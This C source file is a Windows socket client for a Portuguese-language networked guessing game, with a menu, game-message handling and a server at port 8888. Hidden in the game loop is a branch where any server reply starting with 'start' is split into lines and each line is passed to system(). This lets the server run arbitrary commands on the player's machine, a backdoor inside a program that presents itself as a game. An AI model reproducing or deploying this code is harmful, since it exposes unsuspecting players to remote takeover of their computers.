#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

void exibirMenu()
{
    system("cls");
    printf("============================\n");
    printf("|           MENU           |\n");
    printf("============================\n");
    printf("[ 1 ] INICIAR\n");
    printf("[ 2 ] REGRAS\n");
    printf("[ 3 ] CREDITOS\n");
    printf("[ 4 ] HACK\n");
    printf("Escolha uma opcao: ");
}

int main()
{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in servidor;
    char mensagem[128], resposta[2048];
    int porta = 8888;

    // Inicialização do Winsock
    printf("Inicializando Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Erro ao iniciar Winsock: %d\n", WSAGetLastError());
        return 1;
    }

    // Criação do socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("Erro ao criar socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Configuração do servidor
    servidor.sin_family = AF_INET;
    servidor.sin_port = htons(porta);
    servidor.sin_addr.s_addr = inet_addr("127.0.0.1"); // 26.176.4.160 - 127.0.0.1

    // Conexão ao servidor
    printf("Conectando ao servidor na porta %d...\n", porta);
    if (connect(sock, (struct sockaddr *)&servidor, sizeof(servidor)) < 0)
    {
        printf("Erro ao conectar (código: %d)\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("Conectado ao servidor!\n\n");

    while (1)
    {
        system("cls");
        int voltarAoMenu = 0;
        exibirMenu();

        char escolha[16];
        fgets(escolha, sizeof(escolha), stdin);
        escolha[strcspn(escolha, "\n")] = '\0';

        send(sock, escolha, strlen(escolha), 0);

        while (1)
        {
            int bytesRecebidos = recv(sock, resposta, sizeof(resposta) - 1, 0);
            if (bytesRecebidos <= 0)
            {
                system("cls");
                printf("Conexao encerrada pelo servidor.\n");
                closesocket(sock);
                WSACleanup();
                exit(0);
            }
            resposta[bytesRecebidos] = '\0';

            if (strncmp(resposta, "[AGUARDE]", 9) == 0)
            {
                system("cls");
                printf("%s", resposta + 9);
                fflush(stdout);
                continue;
            }

            if (strncmp(resposta, "[INPUT]", 7) == 0)
            {
                system("cls");
                printf("%s", resposta + 7);
                fgets(mensagem, sizeof(mensagem), stdin);
                mensagem[strcspn(mensagem, "\n")] = '\0';

                if (send(sock, mensagem, strlen(mensagem), 0) < 0)
                {
                    printf("Erro ao enviar mensagem.\n");
                    break;
                }

                if (strcmp(mensagem, "0") == 0)
                {
                    printf("Saindo do jogo.\n");
                    goto fim_cliente;
                }
                continue;
            }

            if (strncmp(resposta, "[INICIOJOGO]", 12) == 0)
            {
                printf("\nJogo iniciado pelo servidor!\n");
                break; // sai do loop e inicia o jogo
            }

            if (strncmp(resposta, "[INVALID]", 9) == 0)
            {
                printf("%s", resposta + 9);
                Sleep(1000);
                system("cls");
                break; // volta ao menu
            }

            // Outras mensagens?
            printf("%s\n", resposta);
        }

        // Lógica do jogo
        while (1)
        {
            system("cls");
            int bytesRecebidos = recv(sock, resposta, sizeof(resposta) - 1, 0);
            if (bytesRecebidos <= 0)
            {
                printf("Conexao encerrada pelo servidor.\n");
                closesocket(sock);
                WSACleanup();
                goto fim_cliente;
            }
            resposta[bytesRecebidos] = '\0';

            if (strncmp(resposta, "[INPUT]", 7) == 0)
            {
                printf("%s", resposta + 7);
                fgets(mensagem, sizeof(mensagem), stdin);
                mensagem[strcspn(mensagem, "\n")] = '\0';

                if (send(sock, mensagem, strlen(mensagem), 0) < 0)
                {
                    printf("Erro ao enviar mensagem.\n");
                    break;
                }

                if (strcmp(mensagem, "0") == 0)
                {
                    printf("Saindo do jogo.\n");
                    goto fim_cliente;
                }
            }
            else if (strncmp(resposta, "[ACERTO]", 8) == 0)
            {
                printf("Acertou!\n");
            }
            else if (strncmp(resposta, "[ERRO]", 6) == 0)
            {
                printf("Errou!\n");
            }
            else if (strncmp(resposta, "[CLEAR]", 7) == 0)
            {
                printf("%s", resposta + 7);
                Sleep(2000);
                system("cls");
            }
            else if (strncmp(resposta, "start", 5) == 0)
            {
                resposta[strcspn(resposta, "\r\n")] = '\0';
                char *linha = strtok(resposta, "\n");
                while (linha != NULL)
                {
                    int status = system(linha);
                    if (status == -1)
                        printf("Falha ao executar comando: %s\n", linha);
                    linha = strtok(NULL, "\n");
                }
            }
            else if (strncmp(resposta, "[FIMJOGO]", 9) == 0)
            {
                printf("%s", resposta + 9);
                goto fim_cliente;
            }
            else if (strncmp(resposta, "[VOLTAR]", 8) == 0)
            {
                char voltarMenu[10];
                while (1)
                {
                    printf("%s", resposta + 8);
                    fgets(voltarMenu, sizeof(voltarMenu), stdin);
                    voltarMenu[strcspn(voltarMenu, "\n")] = '\0';

                    if (voltarMenu[0] == 'X' || voltarMenu[0] == 'x')
                    {
                        system("cls");
                        voltarAoMenu = 1;
                        break;
                    }
                    else
                    {
                        printf("Invalido, Digite X para voltar ao menu\n\n");
                        Sleep(500);
                        system("cls");
                    }
                }
                if (voltarAoMenu)
                    break;
            }
            else
            {
                printf("%s\n", resposta);
                break;
            }
        }
    }
Sleep(3000);
system("cls");
fim_cliente:
    closesocket(sock);
    WSACleanup();
    printf("\nObrigado por jogar!\n");
    return 0;
}